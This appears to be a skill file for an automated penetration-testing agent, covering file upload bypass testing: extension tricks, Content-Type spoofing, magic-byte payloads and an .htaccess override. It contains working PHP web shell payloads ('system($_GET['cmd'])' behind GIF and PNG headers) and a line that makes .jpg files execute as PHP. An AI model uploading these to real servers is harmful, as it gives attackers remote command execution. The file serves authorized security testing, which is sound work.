---
name: file_upload
description: File Upload Bypass testing
category: upload
bug_class: file_upload
triggers:
  - file upload
  - upload bypass
  - webshell
  - malicious file
---

# File Upload Bypass Testing

## Key Insight
File upload vulnerabilities occur when an application allows users to upload files without proper validation, potentially allowing execution of malicious code on the server.

## Attack Surface
- File upload forms
- API endpoints accepting file uploads
- Avatar/profile picture uploads
- Document/image upload functionality

## Methodology
1. **Discovery**: Identify upload functionality
2. **Validation Bypass**: Test various bypass techniques
3. **Execution**: Confirm uploaded file can be executed
4. **Impact**: Demonstrate code execution

## Bypass Techniques

### Extension Bypass
```
shell.php.jpg
shell.php%00.jpg
shell.php.jpg.php
shell.phtml
shell.php5
shell.pht
shell.phar
```

### Content-Type Bypass
```
Content-Type: image/jpeg  (with PHP content)
Content-Type: image/png   (with PHP content)
```

### Magic Bytes Bypass
```
GIF89a;<?php system($_GET['cmd']); ?>
\x89PNG\r\n\x1a\n;<?php system($_GET['cmd']); ?>
```

### Double Extension
```
shell.php.jpg
shell.jpg.php
shell.php%00.jpg
```

### .htaccess Upload
```
AddType application/x-httpd-php .jpg
```

## Validation
- Upload a harmless test file (e.g., text file with unique content)
- Try to access the uploaded file
- If accessible, try uploading a file with code execution
- Check if the file is executed or just stored

## False Positive Avoidance
- Just because upload succeeds doesn't mean it's vulnerable
- Verify the file is in a web-accessible directory
- Verify the server processes the file type (not just stores it)
